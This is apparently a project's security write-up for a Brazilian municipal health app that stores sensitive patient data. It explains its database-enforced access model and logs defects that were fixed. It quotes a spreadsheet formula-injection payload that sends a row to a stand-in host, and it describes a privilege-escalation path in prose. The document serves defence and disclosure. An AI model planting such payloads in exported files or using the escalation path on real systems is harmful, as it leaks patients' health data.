# Security

*[Versão em português](../seguranca.md)*

The system stores name, CPF (Brazilian taxpayer number), national health card number, address,
health conditions, medication, pregnancy and child data, and reports of domestic violence and
neglect. It is **sensitive personal data** as defined in article 5, II of Brazil's LGPD, and it is
meant for use by a municipal health department.

This document describes the model and records the defects found and fixed, because knowing where
the system has already failed is more useful than a list of good practices.

---

## The model, in one sentence

Who may read and write what is decided by the **database**, through Row Level Security. The app and
the panel are not the security boundary: both talk to the server with Supabase's public key, which
is public by design and ships inside the published bundle.

That has a consequence that drives everything else: **any access rule the client could bypass is not
an access rule.** Validation on screen is there so people do not make mistakes, not to stop someone
breaking in.

---

## The layers

### 1. Identity

| Where | How |
|---|---|
| App, offline use | local authentication in SQLite, salted hash via `expo-crypto` |
| App, sync | Supabase Auth session, opened at login when there is a connection |
| Web panel | Supabase Auth session, via cookie, refreshed by the middleware |

The app authenticates twice on purpose. Local authentication is what allows working offline, which
is the reason the system exists. The Supabase session is what allows writing to the server, because
the policies decide by `auth.uid()`.

Without a session, sync **stops before trying** and says so. That is not elegance: the queue counts
attempts and marks an item as a permanent error after five. Running without a session, five cycles
would turn a whole day's collection into permanent errors for a reason unrelated to the data.

### 2. Authorisation

Four roles, the same across the system and in the CHECK on `agentes.role`:

| Role | Scope |
|---|---|
| `agente` | their own patients |
| `coordenador` | their own health unit |
| `gerente` | everything, plus the audit trail |
| `admin` | everything, plus user management |

The policies use helper functions (`agente_papel()`, `agente_unidade()`, `pode_ler_prontuario()`)
declared `SECURITY DEFINER` with a locked `search_path`. That breaks the recursion of a policy that
needs to query another RLS-protected table.

Screen guards mirror the policies **on purpose**, and a test checks it (`contratoPapeis.test.ts`). A
guard that does not match the policy produces the worst kind of error: the page opens empty, and the
user concludes there is no data instead of no permission.

### 3. Data at rest

- Passwords: salted hash, constant-time comparison.
- Local database: **encrypted whole with SQLCipher**. The SQLite file on the device is now fully
  encrypted, with a 256-bit key drawn on first run and kept in the device Keystore
  (`database/chave.ts`); it is applied with `PRAGMA key` as the first operation on open
  (`database/database.ts`), before any read. Enabled through `expo-sqlite`'s `useSQLCipher` in
  `app.json`.

  Encrypting the whole database, rather than field by field, was a decision: it keeps the local
  search the agent uses in the field and is real AEAD. The earlier field cipher (`encryptField`,
  hand-made SHA-256 in counter mode, no MAC) was removed, not switched on: an unauthenticated stream
  is malleable, and encrypting `nome` and `cpf` would break search. Before SQLCipher the file was
  protected only by Android's disk encryption, effective while the device is locked.

  Because the file format changes, upgrading from a version without encryption needs a fresh install;
  in an offline-first system the data comes back from the server on sync. That is why the version
  moved to 1.2.0 (`versionCode` 3).
- Encryption key and session token: SecureStore (Keychain on iOS, Keystore on Android).
- `senha_hash` is unreadable by the client: the `GRANT` on `agentes` is column by column, and that
  column is left out.
- Deletion is logical (`deleted_at`), not physical.

It is worth knowing **why the GRANT is column by column**: `REVOKE SELECT (column)` has no effect
when there is a `GRANT` on the whole table. What works is revoking the table and granting the allowed
columns one by one.

### 4. Audit trail

`audit_log` is append-only on the server: it has INSERT and SELECT policies, and `REVOKE UPDATE,
DELETE` on top, so not even the `authenticated` role can try to change an audit row. Reading is
restricted to managers and admins.

### 5. Data in transit

All sync is over HTTPS. On top of the system trust store, the app **pins the Supabase certificate**
through Android's network security config (`plugins/fixar-certificado.js`): a connection is accepted
only if the TLS chain goes through one of two public keys, the Google Trust Services intermediate
(WE1) that signs the host and the GTS Root R4 as a backup.

Pinning the intermediate and the root, not the leaf, was a decision: the Supabase leaf rotates on its
own, the two anchors do not, and two pins keep a rotation of one from taking sync down in the field.
The `pin-set` has an `expiration`: if Google changes its own chain, past that date Android stops
enforcing the pin instead of locking the agent out with no remote fix. Renewing means recomputing the
pins with `openssl` and shipping a new version before the date; the procedure is in the plugin header.

---

## Defects found and fixed

Each one was reproduced on a PostgreSQL with the real schema, migrations and policies, before and
after the fix. The error message quoted is the one the database returned.

### Seven tables without Row Level Security

`agentes`, `audit_log` and the five `prontuario_*` tables had no RLS. With the public key, anyone
read and wrote health records, CPFs and password hashes.

Measured before the fix: a visitor without login read 2 health records and 4 agents with CPF; one
agent read another's patient; a coordinator read another unit.

Fixed with RLS and policies on every table, plus column-level `GRANT`s on `agentes`. Suite:
`rodar-testes-rls.sh`, 22 checks.

### Privilege escalation in sign-up approval

The `aprovarSolicitacao` and `rejeitarSolicitacao` Server Actions received the approver's id **as a
parameter**, trusted it, and used the service client, which bypasses RLS. There was no session or
role check.

The path was direct and needed no credentials: fill in the public sign-up choosing the "gerente"
role, call `aprovarSolicitacao` with your own request id and any uuid as approver, and receive a
manager account. Rate limiting did not help, because it counted by a value the attacker chose.

Fixed: identity comes from the session cookie, the parameter was removed from the signature, and the
role is checked with the same rule as the audit policy. Twelve tests, checked against the vulnerable
code.

### Published administrator password

The password of the administrator created on first run was the constant `Admin@2025`, written in the
repository, in a README table and printed on the app's settings screen. The repository is public.

Fixed: generated by `sortearSenhaForte`, stored in SecureStore, shown once and deletable.

### Formula injection in spreadsheets

Report export escaped commas, quotes and line breaks, but not a leading `=`. Excel and LibreOffice
execute cells starting with `=`, `+`, `-`, `@`, tab or carriage return, and visit notes are free text
typed in the field.

A cell with `=HYPERLINK("http://fora.example/"&A1,"clique")` would exfiltrate the row when someone at
the health department opened the file. Fixed in the app and the panel with an apostrophe prefix,
which spreadsheets treat as text.

### Critical framework vulnerability

Next.js 15.5.20 had two critical unauthenticated RCEs, one specific to Windows servers. Upgraded to
15.5.27, which closes the line's twelve advisories. The app's `axios` had twelve advisories, among
them SSRF via redirect; upgraded to 1.20.0.

CI gained a gate: `npm audit --omit=dev` must stay at zero on the panel, and no criticals on the app.

### The audited read could be bypassed

`fn_ler_morador` records who opened a record, but the `moradores` table had full `SELECT` for
`authenticated`. Any signed-in user asked PostgREST directly for `cpf`, `cartao_sus` or `doencas` and
read them without a trace, and the panel's own family screen did that with `moradores(*)`.

Fixed on 28/10/2026 with column-level `GRANT`s, as for `agentes.senha_hash`. Lists read name, age and
markers; the rest only comes out through the audited function. Document search became
`fn_buscar_morador_por_documento`: exact match, so it cannot serve as a prefix oracle, logged without
storing the document.

The database test found a side effect before production: Postgres requires reading the columns an
`INSERT ... ON CONFLICT DO UPDATE` updates, and the app synced residents with upsert. The message was
`permission denied for table moradores`. The app now writes with INSERT and, on retry, UPDATE by id.
Suite: `rodar-testes-colunas.sh`.

### Deactivated accounts kept access

`agentes.ativo` was not checked by any policy. Deactivating an agent removed them from lists, and the
open session kept reading records. Fixed with one `RESTRICTIVE` policy per data table, which Postgres
combines with AND with the existing policies without rewriting them.

### Dashboard functions failed open

The six indicator functions are `SECURITY DEFINER` and chose their scope by the caller's role. A null
role, from someone without login or without an account, matched no `IF` and fell into the manager
branch: four of them returned whole-city numbers and agent names to anyone with just the public key.
They also lacked a locked `search_path`. They now refuse without an active account, lock the
`search_path` and cannot be executed by `anon`. Suite: `07-conta-ativa.sql`, inside
`rodar-testes-colunas.sh`.

### Published panel without a database and without the fixes

On 29/10/2026 the production panel was still serving the May version. The Vercel project had been
deployed by hand and was not linked to the repository, so no merge reached production, and the
environment variables held example values: `/api/health` answered `misconfigured`. None of the fixes
in this document applied to anyone opening the site, and DAST was assessing the old code.

Fixed: the project was linked to the repository with the `produção` branch and the `ConectAgente-web`
folder, and the variables received real values, with the service key stored as a secret.
`/api/health` now answers `healthy`.

### Injected styles allowed by the content security policy

`style-src` had `'unsafe-inline'` because `globals.css` imported the font from Google on top of
`next/font`. So an injected `<style>` went through, and CSS attribute selectors leak on-screen field
values, one character per request. The import also sent every visitor's IP to Google.

Fixed on 29/10/2026: the font comes only from `next/font`, served by the site itself; `style-src`
only accepts the request nonce; `style=""` attributes remain allowed through `style-src-attr`,
because the components and charts render styles that way. Checked in Chromium with no violations on
`/login`, `/registro` and `/demo`. `Cross-Origin-Embedder-Policy: credentialless`,
`Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy` were added too.

### The visitor had table privileges

Flagged by the Supabase security advisor on 09/11/2026. The `anon` role, used with the public key
without signing in, had `SELECT` on the columns of `agentes` (CPF, e-mail, phone), `INSERT`,
`UPDATE`, `DELETE` and `TRUNCATE` on the data tables, and could execute the policy helper functions
through `/rest/v1/rpc`. RLS filtered rows, but `TRUNCATE` does not go through it, and the defence
relied on the API never issuing that command.

Nothing in the system uses `anon` for data: sign-in is through Supabase Auth and every read happens
after it. `migration_sem_anonimo.sql` removes every table, sequence and helper-function privilege
from `anon`, including on objects created later, removes `TRUNCATE` from `authenticated`, locks the
`search_path` of the two trigger functions and drops the `solicitacoes_insert_anon` policy
(`WITH CHECK (true)`), which let anyone write registration requests straight through the API,
bypassing the screen's validation and rate limit. Suite: `08-sem-anonimo.sql`; the RLS suite now
requires a refusal, not zero rows.

Side effect found when applying it in production: `/api/health` queried `agentes` without signing
in using `HEAD`, which returns no body, so a permission refusal looked the same as an invalid key,
a 401. Health started reporting `degraded` with the database up. Fixed with `GET`, which carries the
`42501` code in the body.

### Medical record forms readable through the API

Blood pressure, glucose, prenatal care, child vaccination, screening and reports of violence were
readable straight through PostgREST by any signed-in user, within RLS and without logging. Nobody
needs that read: the panel never opens a medical record form, and the app keeps the form on the
device and only sends it. `migration_prontuario_fechado.sql` leaves only the keys readable.

The app wrote the forms with upsert, which Postgres refuses when the user cannot read the updated
columns (the same effect seen on `moradores`). 1.2.2 writes with `INSERT` and, on retry, `UPDATE`
by `prontuario_id`. Suite: `09-prontuario-fechado.sql`, including that the old upsert is refused
rather than silently accepted.

## Still open

- **The forms only close with 1.2.2 installed.** The migration refuses earlier versions' upsert, so
  it goes into the database together with the 1.2.2 rollout.
- **Build dependencies with open advisories:** `deepmerge` (from Jest), `uuid` 7 and `image-size` 1
  (from Metro and config-plugins), and `glob` and `minimatch` (a ReDoS that only fires with an
  attacker-supplied pattern; here the pattern is fixed tool configuration, and the fix needs majors
  the tools do not accept). They are build tools and do not ship in the delivered bundle.
  `image-size` 2.x and `uuid` 11.x would fix the advisories but break Metro bundling, and that was
  measured: `TypeError: The "list" argument must be an instance of SharedArrayBuffer`. `node-forge`
  left this list on 02/11/2026 with 1.4.1, and `braces` and `sprintf-js` no longer show up in OSV.
- **Rate limiting is in process memory.** Fine for one server; with more than one instance, each
  counts separately.
- **There is no second factor** for the panel, where everyone's records are read.

---

## Reporting a flaw

See the [security policy](security-policy.md).
